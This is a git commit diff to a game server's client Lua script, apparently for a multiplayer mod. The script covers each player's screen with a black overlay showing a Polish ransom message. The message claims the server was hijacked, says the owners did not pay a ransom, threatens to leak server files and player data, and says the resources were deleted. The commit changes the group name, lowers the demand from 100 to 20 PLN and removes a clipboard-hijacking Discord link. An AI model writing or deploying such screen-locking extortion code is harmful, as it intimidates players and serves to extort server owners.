4a4eb2d8b610233d589581c0fc4a6a989882e18c
SOCZEKDEV <103373053+SOCZEKDEV@users.noreply.github.com>
2025-10-07 20:43:00 +0200

    Update client.lua

--- client.lua
+++ client.lua
@@ -8,7 +8,7 @@ addEventHandler('onClientRender', root, function()
     -- if isConsoleActive() then return end
     dxDrawRectangle(0, 0, sx, sy, 0xFF000000, true)
 
-    dxDrawText('SERWER ZOSTAŁ PRZEJĘTY PRZEZ PSEUDOL CORP.', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
-    dxDrawText('Niestety właściciele tego serwera nie zapłacili okupu w wysokości 100PLN\nInformujemy iż zasoby serwera wkrótce zostaną udostępnione publiczne wraz z danymi graczy. Zasoby na serwerze zostały usunięte\nDziękujemy za gre!', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
-    setClipboard("https://discord.gg/e8dwB7mF")
+    dxDrawText('SERWER ZOSTAŁ PRZEJĘTY PRZEZ HAKERÓW Z PODLASIA!', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
+    dxDrawText('Niestety właściciele tego serwera nie zapłacili okupu w wysokości 20PLN\nInformujemy iż zasoby serwera wkrótce zostaną udostępnione publiczne wraz z danymi graczy. Zasoby na serwerze zostały usunięte\nDziękujemy za gre!', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
     end)
+
